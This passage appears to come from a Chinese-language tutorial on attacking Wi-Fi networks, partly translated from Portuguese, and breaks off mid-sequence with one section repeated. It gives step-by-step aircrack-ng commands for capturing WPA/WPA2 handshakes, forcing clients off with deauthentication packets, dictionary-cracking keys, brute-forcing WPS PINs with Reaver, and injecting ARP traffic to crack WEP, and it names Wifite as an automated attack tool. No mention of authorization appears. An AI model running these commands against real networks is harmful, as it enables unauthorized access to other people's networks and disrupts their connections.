    airodump-ng -c [canal] --bssid [BSSID] -w capture wlan0mon

    ```

    让 `airodump-ng` 运行，直到捕获到握手，这可以在窗口的右上角看到。


    3. 强制客户端断开以捕获握手：

    ```

    aireplay-ng --deauth 10 -a [BSSID] -c [MAC do cliente] wlan0mon

    ```

    这种技术会断开客户端，强制其重新连接，从而捕获握手。


    4. 使用捕获的握手破解 WPA/WPA2 密钥：

    ```

    aircrack-ng -w [password list] -b [BSSID] capture*.cap

    ```


    ### 使用 Reaver 进行 WPS 攻击


    WPS (Wi-Fi Protected Setup)是一项旨在让设备连接到 Wi-Fi 网络更方便的功能。然而，它因漏洞闻名，特别是容易受到暴力破解攻击。Reaver
    是一个利用这些漏洞的流行工具。


    1. 将接口设置为监听模式：

    ```

    airmon-ng start wlan0

    ```


    2. 启动 WPS 攻击：

    ```

    reaver -i wlan0mon -b [BSSID] -vv

    ```

    上述命令强制 `Reaver` 对 WPS PIN 进行暴力破解，尝试不同的组合，直到发现正确的 PIN，从而发现 WPA/WPA2 密码。


    # 无线网络分析的其他工具


    ### Wireshark


    Wireshark 是一种广泛使用的数据包分析工具，用于实时监控和分析网络流量。它可以用于捕获数据包并检测无线网络中的异常和漏洞。


    ### kismet


    Kismet 是一种无线网络检测和嗅探器工具。它可以检测隐藏的无线网络、捕获数据包并识别已连接的设备。


    ### Wifite


    Wifite 是一种简化 Wi-Fi 网络攻击过程的自动化工具。它集成了多种攻击工具，如 `Aircrack-ng` 和 `Reaver`，并自动化了执行
    WEP、WPA/WPA2 和 WPS 密钥破解攻击的步骤。使用 `Wifite`，你可以通过简单的命令选择目标并启动攻击，使过程更容易，特别是对于初学者。


    #### `wifite`


    在执行上述命令时，`Wifite` 会自动搜索存在漏洞的无线网络并为特定攻击提供选项，简化多次攻击的执行。


    # 攻击示例


    ### 破解 WEP


    为了说明使用 `Aircrack-ng` 对 WEP 网络的典型攻击，请遵循以下步骤：


    1. 启动监听模式：

    ```

    airmon-ng start wlan0

    ```


    2. 识别目标网络：

    ```

    airodump-ng wlan0mon

    ```

    记住目标网络的 `BSSID` 和信道。


    3. 捕获数据包：

    ```

    airodump-ng -c [canal] --bssid [BSSID] -w capture wlan0mon

    ```


    4. 注入包：

    ```

    aireplay-ng --arpreplay -b [BSSID] wlan0mon

    ```

    这一步增加了流量量，加快了捕获 IV（初始化向量）的过程。


    5. 破解 WEP 密钥：

    ```

    aircrack-ng capture*.cap

    ```

    在捕获到足够的 IV 后，使用 `aircrack-ng` 发现 WEP 密钥。


    ### 破解 WPA/WPA2


    对于 WPA/WPA2 网络，过程涉及捕获握手，然后使用该捕获包尝试破解密码：


    1. 启动监听模式：

    ```

    airmon-ng start wlan0

    ```


    2. 捕获握手：

    ```

    airodump-ng -c [canal] --bssid [BSSID] -w capture wlan0mon

    ```

    让 `airodump-ng` 运行，直到捕获到握手，这可以在窗口的右上角看到。


    3. 强制客户端断开以捕获握手：

    ```

    aireplay-ng --deauth 10 -a [BSSID] -c [MAC do cliente] wlan0mon

    ```

    这种技术会断开客户端，强制其重新连接，从而捕获握手。


